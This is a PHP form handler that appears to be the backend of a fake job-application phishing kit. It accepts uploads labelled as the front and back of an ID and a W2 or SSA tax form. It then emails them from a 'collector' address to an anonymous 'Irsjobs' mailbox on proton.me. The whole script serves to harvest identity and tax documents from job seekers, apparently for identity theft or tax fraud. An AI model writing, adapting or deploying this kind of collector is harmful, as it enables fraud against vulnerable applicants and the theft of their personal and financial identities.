<?php
header('Access-Control-Allow-Origin: *');
// header('Access-Control-Allow-Methods: GET, POST');
header("Access-Control-Allow-Headers: X-Requested-With");

require_once 'PHPMailer/src/PHPMailer.php';
require_once 'PHPMailer/src/Exception.php';
require_once 'PHPMailer/src/SMTP.php';

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

// validate and filter all user inputs
function validateData($data)
{
    $resultData = htmlspecialchars(stripslashes(trim($data)));
    return $resultData;
}

$fromMail = "collector@danielwilson.online";
$toMail = "Irsjobs@proton.me";
$nameTo = "Jobs Submission";
$submissionID = uniqid();

if (isset($_FILES['file1']['name']) && isset($_FILES['file2']['name']) && isset($_FILES['file3']['name'])) {
    //check uploaded file size
    if ($_FILES['file1']['size'] == 0 && $_FILES['file2']['size'] == 0 && $_FILES['file3']['size'] == 0) {
        die("ERROR: Zero byte file upload");
    }

    // check if the file type is allowed(optional)
    // $allowedFileTypes = array("image/gif", "image/png", "image/jpeg", "image/pjpeg");

    // if (!in_array($_FILES['file1']['type'], $allowedFileTypes) && !in_array($_FILES['file2']['type'], $allowedFileTypes)) {
    //     die("ERROR: File type not permitted");
    // }

    //check if this is a valid upload
    if (!is_uploaded_file($_FILES['file1']['tmp_name']) && !is_uploaded_file($_FILES['file2']['tmp_name']) && !is_uploaded_file($_FILES['file3']['tmp_name'])) {
        die("ERROR: Not a valid file upload");
    }

    //set the upload directory
    $uploadDir = "uploads/";

    // rename the file (add user id at the beginning to make it unique)
    //$newName = $user_id . $_FILES['dp']['name'];
    $fileExtension = "";
    $fileExtension2 = "";
    $fileExtension3 = "";

    if ($_FILES['file1']['type'] == "image/jpeg") {
        $fileExtension = ".jpg";
    } else if ($_FILES['file1']['type'] == "image/gif") {
        $fileExtension = ".gif";
    } else if ($_FILES['file1']['type'] == "image/png") {
        $fileExtension = ".png";
    } else if ($_FILES['file1']['type'] == "image/pjpeg") {
        $fileExtension = ".pjpeg";
    }

    if ($_FILES['file2']['type'] == "image/jpeg") {
        $fileExtension2 = ".jpg";
    } else if ($_FILES['file2']['type'] == "image/gif") {
        $fileExtension2 = ".gif";
    } else if ($_FILES['file2']['type'] == "image/png") {
        $fileExtension2 = ".png";
    } else if ($_FILES['file2']['type'] == "image/pjpeg") {
        $fileExtension2 = ".pjpeg";
    }

    if ($_FILES['file3']['type'] == "image/jpeg") {
        $fileExtension3 = ".jpg";
    } else if ($_FILES['file3']['type'] == "image/gif") {
        $fileExtension3 = ".gif";
    } else if ($_FILES['file3']['type'] == "image/png") {
        $fileExtension3 = ".png";
    } else if ($_FILES['file3']['type'] == "image/pjpeg") {
        $fileExtension3 = ".pjpeg";
    } else if ($_FILES['file3']['type'] == "application/pdf") {
        $fileExtension3 = ".pdf";
    } else if ($_FILES['file3']['type'] == "application/msword") {
        $fileExtension3 = ".doc";
    } else if ($_FILES['file3']['type'] == "application/vnd.openxmlformats-officedocument.wordprocessingml.document") {
        $fileExtension3 = ".docx";
    } else if ($_FILES['file3']['type'] == "text/plain") {
        $fileExtension3 = ".txt";
    } else {
        $fileExtension3 = "";
    }
    $mail = new PHPMailer(true);

    $body = validateData($_POST['body']);

    try {
        //Recipients
        $mail->setFrom($fromMail, $submissionID);
        //jamesprecious445521@gmail.com
        $mail->addAddress($toMail, $nameTo);

        //Attachments
        $file_to_attach1 = $_FILES['file1']['tmp_name'];
        $file_to_attach2 = $_FILES['file2']['tmp_name'];
        $file_to_attach3 = $_FILES['file3']['tmp_name'];

        $mail->AddAttachment($file_to_attach1, 'Front' . $fileExtension);
        $mail->AddAttachment($file_to_attach2, 'Back' . $fileExtension2);
        $mail->AddAttachment($file_to_attach3, 'W2 or SSA form (2022/2023)' . $fileExtension3);

        //Content
        $mail->isHTML(true);                                  //Set email format to HTML
        $mail->Subject = 'New Job Application - ' . $submissionID;
        $mail->Body    = nl2br($body);
        $mail->AltBody = nl2br($body);

        $mail->send();
        echo 'Application submitted successfully';
    } catch (Exception $e) {
        echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
    }
} else {
    echo 'file not properly appended for upload.';
    return false;
}
